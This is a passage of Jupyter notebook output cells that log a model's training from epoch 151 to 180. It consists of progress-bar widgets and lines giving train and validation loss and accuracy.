      "application/vnd.jupyter.widget-view+json": {
       "model_id": "21dbef65d5624d67b22d9d11331ad1aa",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:13:30 | INFO | Validation Loss: 1.0305 | Validation Accuracy: 0.8025\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "639dfceff7774adba29009fb9ee48c2d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:13:46 | INFO | Epoch 151 | Train Loss: 0.2387 | Train Accuracy: 0.9496\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "97f0d8a574804415b1c62360f2914587",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:13:48 | INFO | Validation Loss: 1.1157 | Validation Accuracy: 0.8039\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4fe012fc449244419ad6dde0fa9402aa",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:14:04 | INFO | Epoch 152 | Train Loss: 0.2477 | Train Accuracy: 0.9476\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "afa473e325d34c2dacc1bf40aa79ef56",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:14:05 | INFO | Validation Loss: 1.0830 | Validation Accuracy: 0.8039\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9a62c7b112bd42b584f284940dd5bfa0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:14:21 | INFO | Epoch 153 | Train Loss: 0.2425 | Train Accuracy: 0.9486\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2e7484f76de44a36afacd77c8435ae88",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:14:23 | INFO | Validation Loss: 0.9710 | Validation Accuracy: 0.8224\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0612e808f38d4a79b176a1dae01bb730",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:14:38 | INFO | Epoch 154 | Train Loss: 0.2354 | Train Accuracy: 0.9502\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fdb5afa6991b487ca9cb0341e8cf5a5f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:14:40 | INFO | Validation Loss: 1.1251 | Validation Accuracy: 0.8010\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "92c04db7d2bd462e8b7f9cbd46b5b8e2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:14:56 | INFO | Epoch 155 | Train Loss: 0.2315 | Train Accuracy: 0.9510\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8c8448b4cc544584b9192b20cb318cef",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:14:58 | INFO | Validation Loss: 0.9626 | Validation Accuracy: 0.8265\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0b7b4232dbee4f8f832daca0ffb8f5e0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:15:14 | INFO | Epoch 156 | Train Loss: 0.2386 | Train Accuracy: 0.9495\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f095cfb308c04d289e4f59f0391bb0e7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:15:16 | INFO | Validation Loss: 1.1776 | Validation Accuracy: 0.7844\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2a672a29bc4f414fbb17e1447f68c718",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:15:32 | INFO | Epoch 157 | Train Loss: 0.2462 | Train Accuracy: 0.9471\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e64427ef8fe14c60aa35737b5fb2538d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:15:33 | INFO | Validation Loss: 1.0327 | Validation Accuracy: 0.8075\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8ed19e4805ef48dcbc3699f4747e1c42",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:15:49 | INFO | Epoch 158 | Train Loss: 0.2298 | Train Accuracy: 0.9517\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "04acc2a946914c95a6bfd7b370e4a060",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:15:50 | INFO | Validation Loss: 1.1957 | Validation Accuracy: 0.7740\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0fa8594abe924f0ba0bdeca47b89abd1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:16:06 | INFO | Epoch 159 | Train Loss: 0.2228 | Train Accuracy: 0.9525\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e8c7926070634ed8b87e053564400a71",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:16:08 | INFO | Validation Loss: 1.0357 | Validation Accuracy: 0.8049\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a6ac776e4c9a4c8fa2e6482f89fd515c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:16:24 | INFO | Epoch 160 | Train Loss: 0.2259 | Train Accuracy: 0.9526\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f354d742f52b417095b7cee6aea439df",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:16:26 | INFO | Validation Loss: 1.1797 | Validation Accuracy: 0.7942\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5e82dc975dde4a34ab995f9ff7c5e142",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:16:42 | INFO | Epoch 161 | Train Loss: 0.2881 | Train Accuracy: 0.9376\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bb50442b31b5454cb87856b4df30cbb3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:16:44 | INFO | Validation Loss: 0.6274 | Validation Accuracy: 0.8886\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d99af90c83034fa48d409c0a210b73db",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:17:00 | INFO | Epoch 162 | Train Loss: 0.2634 | Train Accuracy: 0.9431\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d47514d82d9a47aebc205a7ab1d518e1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:17:01 | INFO | Validation Loss: 0.9356 | Validation Accuracy: 0.8075\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "55358a8cf7a24343884a2be30c0cd2f4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:17:18 | INFO | Epoch 163 | Train Loss: 0.2153 | Train Accuracy: 0.9545\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c8c4ac6d627d40269ed5707b3ee214bf",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:17:20 | INFO | Validation Loss: 1.0126 | Validation Accuracy: 0.8086\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "71c2515a65ba4eafad0358d282ef3bf0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:17:35 | INFO | Epoch 164 | Train Loss: 0.2155 | Train Accuracy: 0.9543\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "be3b650c74074265a7ddeedb5da4bfbb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:17:37 | INFO | Validation Loss: 0.8518 | Validation Accuracy: 0.8323\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "65a44ecd08b641d7ba233190ea91ec7e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:17:53 | INFO | Epoch 165 | Train Loss: 0.2111 | Train Accuracy: 0.9548\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cee6cb8e28354ce79c074244f4ee0d41",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:17:54 | INFO | Validation Loss: 0.9469 | Validation Accuracy: 0.8043\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "76bc1b17026343ec89300b5703ba9987",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:18:10 | INFO | Epoch 166 | Train Loss: 0.2167 | Train Accuracy: 0.9538\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "07e586326fe942ce947977fb4549f413",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:18:12 | INFO | Validation Loss: 0.9222 | Validation Accuracy: 0.8293\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f4f350ad165f46c0869e82a0b80583c6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:18:29 | INFO | Epoch 167 | Train Loss: 0.1977 | Train Accuracy: 0.9582\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "53463b001a194002b1190ca998f62cae",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:18:31 | INFO | Validation Loss: 1.0733 | Validation Accuracy: 0.7947\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "eec42f1c3df249bebe8409563395dc81",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:18:47 | INFO | Epoch 168 | Train Loss: 0.2026 | Train Accuracy: 0.9566\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "312cd93e664945dd9afbb0d1be0fb7d2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:18:49 | INFO | Validation Loss: 1.0319 | Validation Accuracy: 0.8108\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "82da4b2327dd46f1ae0b23130584a145",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:19:05 | INFO | Epoch 169 | Train Loss: 0.1971 | Train Accuracy: 0.9584\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1daa3135a44d434fb6eed14f35933e6d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:19:06 | INFO | Validation Loss: 1.0427 | Validation Accuracy: 0.8073\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1dd1328ce69e43d8af874783b8ae7751",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:19:23 | INFO | Epoch 170 | Train Loss: 0.2029 | Train Accuracy: 0.9573\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5c06ae517ba34c55bba8e7d36b95d792",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:19:24 | INFO | Validation Loss: 1.0304 | Validation Accuracy: 0.8153\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1194c817c78940908f8acd35d1967f5d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:19:40 | INFO | Epoch 171 | Train Loss: 0.1937 | Train Accuracy: 0.9589\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "69e4c41e1ceb45b89a00680875897955",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:19:41 | INFO | Validation Loss: 0.9723 | Validation Accuracy: 0.8186\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f9b1ec3b4a9446f4aeb44e1606d4820e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:19:57 | INFO | Epoch 172 | Train Loss: 0.2067 | Train Accuracy: 0.9561\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b75181b0ba984c13a63991a64c85113c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:19:59 | INFO | Validation Loss: 0.8898 | Validation Accuracy: 0.8390\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2c2dee34c52c4164b14e099681457fa3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:20:15 | INFO | Epoch 173 | Train Loss: 0.2001 | Train Accuracy: 0.9571\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "48009a0b12e5438380a40146febdc96e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:20:17 | INFO | Validation Loss: 0.9168 | Validation Accuracy: 0.8323\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ddc52b54301a4588b9c46ab2cb8025d7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:20:33 | INFO | Epoch 174 | Train Loss: 0.2037 | Train Accuracy: 0.9568\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ca8a246ae8bc4dee8854623004d6f80d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:20:35 | INFO | Validation Loss: 1.0473 | Validation Accuracy: 0.8223\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a7cc0f5cb7f749bbbd9c9e16bec6692e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:20:50 | INFO | Epoch 175 | Train Loss: 0.1976 | Train Accuracy: 0.9580\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a62bcf9253994a28bc46c5b1e42a7709",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:20:52 | INFO | Validation Loss: 1.0059 | Validation Accuracy: 0.8116\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "301aed5898bf4afd8e5fc8f814739a79",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:21:08 | INFO | Epoch 176 | Train Loss: 0.2067 | Train Accuracy: 0.9559\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4b69ee97499c4b7b906271782e4c83b6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:21:09 | INFO | Validation Loss: 1.0672 | Validation Accuracy: 0.7992\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4c6c1bb49970430aa51427f474732f89",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:21:26 | INFO | Epoch 177 | Train Loss: 0.1875 | Train Accuracy: 0.9602\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b7982281546c46f5ba21b7bdf380e3f5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:21:28 | INFO | Validation Loss: 1.0665 | Validation Accuracy: 0.8086\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "24039dbe43b94dd99b326f07482dbb88",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:21:44 | INFO | Epoch 178 | Train Loss: 0.1874 | Train Accuracy: 0.9604\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1a365d176e694cc1b55b382b33f47020",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:21:46 | INFO | Validation Loss: 1.1151 | Validation Accuracy: 0.8046\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "62a742562f6f42778ec98b8f81dcc472",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:22:03 | INFO | Epoch 179 | Train Loss: 0.1917 | Train Accuracy: 0.9594\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3b264c67eec749e28b8ab820a7aece47",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:22:04 | INFO | Validation Loss: 0.9640 | Validation Accuracy: 0.8173\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "de335a5f25da409dbae25f8b8fc0b01e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:22:24 | INFO | Epoch 180 | Train Loss: 0.1907 | Train Accuracy: 0.9593\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "de7520f8a982446cb26c956917756531",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
